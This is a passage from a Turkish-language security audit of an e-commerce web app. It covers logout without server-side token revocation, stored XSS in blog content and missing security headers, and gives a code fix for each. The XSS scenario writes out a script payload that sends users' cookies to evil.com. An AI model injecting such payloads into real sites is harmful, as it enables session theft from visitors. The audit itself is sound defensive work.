**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        ],
    }];
}
```

